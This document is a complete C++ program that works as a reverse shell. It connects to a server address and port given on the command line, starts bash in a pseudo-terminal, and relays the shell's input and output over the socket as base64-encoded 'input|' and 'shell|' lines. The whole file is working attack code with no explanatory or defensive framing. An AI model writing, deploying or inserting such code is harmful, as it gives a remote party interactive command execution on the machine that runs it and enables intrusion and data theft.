#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string>
#include <iostream>
#include <thread>
#include <vector>
#include <sstream>
#include <termios.h>
#include <cstring>
#include <pty.h>
#include <sys/types.h>
#include <sys/wait.h>

// ---------------------
// C++ Base64 encode
// ---------------------
static const std::string base64_chars =
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

std::string base64_encode(const std::string &in) {
    std::string out;
    int val=0, valb=-6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

// ---------------------
// Decode Base64
// ---------------------
std::string base64_decode(const std::string &in) {
    std::string out;
    std::vector<int> T(256,-1);
    for(int i=0;i<64;i++) T[base64_chars[i]]=i;

    int val=0, valb=-8;
    for (unsigned char c : in) {
        if (T[c]==-1) break;
        val = (val<<6)+T[c];
        valb +=6;
        if (valb>=0) {
            out.push_back(char((val>>valb)&0xFF));
            valb-=8;
        }
    }
    return out;
}

// ---------------------
// Send TCP message
// ---------------------
void send_message(int sock, const std::string &msg) {
    send(sock, msg.c_str(), msg.size(), 0);
}

// ---------------------
// Read from TCP and write to bash
// ---------------------
void tcpToBash(int sock, int master_fd) {
    char buf[1024];
    while (true) {
        int n = recv(sock, buf, sizeof(buf), 0);
        if (n <= 0) break;
        std::string data(buf, n);
        std::istringstream ss(data);
        std::string line;
        while (std::getline(ss, line)) {
            if (line.rfind("input|",0)==0) {
                std::string b64 = line.substr(6);
                std::string decoded = base64_decode(b64);
                write(master_fd, decoded.data(), decoded.size());
            }
        }
    }
}

// ---------------------
// Read from bash and send to TCP
// ---------------------
void bashToTcp(int master_fd, int sock) {
    char buf[1024];
    while (true) {
        int n = read(master_fd, buf, sizeof(buf));
        if (n <= 0) break;
        std::string chunk(buf, n);
        std::string b64 = base64_encode(chunk);
        send_message(sock, "shell|" + b64 + "\n");
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        std::cout << "Usage: ./client <server_ip> <port>\n";
        return 0;
    }

    const char *server_ip = argv[1];
    int port = atoi(argv[2]);

    // connect to server
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, server_ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        return 1;
    }

    // create pseudo-terminal
    int master_fd;
    pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (pid < 0) { perror("forkpty"); return 1; }
    if (pid == 0) {
        // child process -> exec bash
        execlp("bash","bash",NULL);
        perror("execlp");
        exit(1);
    }

    // parent process -> forward data
    std::thread t1(tcpToBash, sock, master_fd);
    std::thread t2(bashToTcp, master_fd, sock);

    t1.join();
    t2.join();

    close(sock);
    return 0;
}
